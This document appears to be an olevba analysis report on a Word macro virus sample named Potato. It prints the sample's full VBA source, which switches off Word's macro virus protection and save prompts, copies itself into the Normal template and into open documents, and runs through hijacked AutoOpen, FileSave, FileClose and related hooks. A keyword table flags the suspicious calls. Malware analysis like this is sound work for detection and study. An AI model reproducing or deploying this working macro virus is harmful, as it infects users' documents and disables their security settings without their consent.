olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Potato-10109684e2a2e2d0f83bb3ae3a0ac81ff1fe73ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Potato-10109684e2a2e2d0f83bb3ae3a0ac81ff1fe73ac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO potato.bas 
in file: Virus.MSWord.Potato-10109684e2a2e2d0f83bb3ae3a0ac81ff1fe73ac - OLE stream: 'Macros/VBA/potato'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Skip As Integer
    
Sub potato()
    
On Error Resume Next
With Options
    .VirusProtection = (rnd * 0)
    .ConfirmConversions = (rnd * 0)
    .SaveNormalPrompt = (rnd * 0)
End With

ActiveDocument.ReadOnlyRecommended = False
bluerabbitobject = 0
Set targetrabbitobject = MacroContainer
'whiterabbitobject = GetAttr(NormalTemplate.FullName)
If targetrabbitobject = NormalTemplate Then bluerabbitobject = 1
If bluerabbitobject = 1 Then yellowrabbitobject = NormalTemplate.FullName Else yellowrabbitobject = ActiveDocument.FullName
If bluerabbitobject = 1 Then pinkrabbitobject = ActiveDocument.FullName Else pinkrabbitobject = NormalTemplate.FullName
Application.OrganizerCopy Source:=yellowrabbitobject, Destination:=pinkrabbitobject, Name:="potato", Object:=wdOrganizerObjectProjectItems
If bluerabbitobject = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If bluerabbitobject = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
fuxors:
End Sub
Sub FileNew()
    On Error Resume Next
    Call potato
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call potato
End Sub
Sub FileSave()
    On Error Resume Next
    Call potato
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call potato
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call potato
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call potato
End Sub
Sub FileExit()
    On Error Resume Next
    Call potato
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call potato
End Sub
Sub AutoExit()
    On Error Resume Next
    Call potato
End Sub
Sub AutoClose()
    On Error Resume Next
    Call potato
End Sub
Sub green(strFile As String)
    
'Dim hFile As Long
'On Error Resume Next
'hFile = FreeFile
'Open strFile For Output Access Write As hFile
'Print #hFile, "@echo off"
'Print #hFile, "@echo 1 Patato 2 patato 3 patato 4"
'Print #hFile, "@echo 5 Patato 6 patato 7 patato more"
'Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+

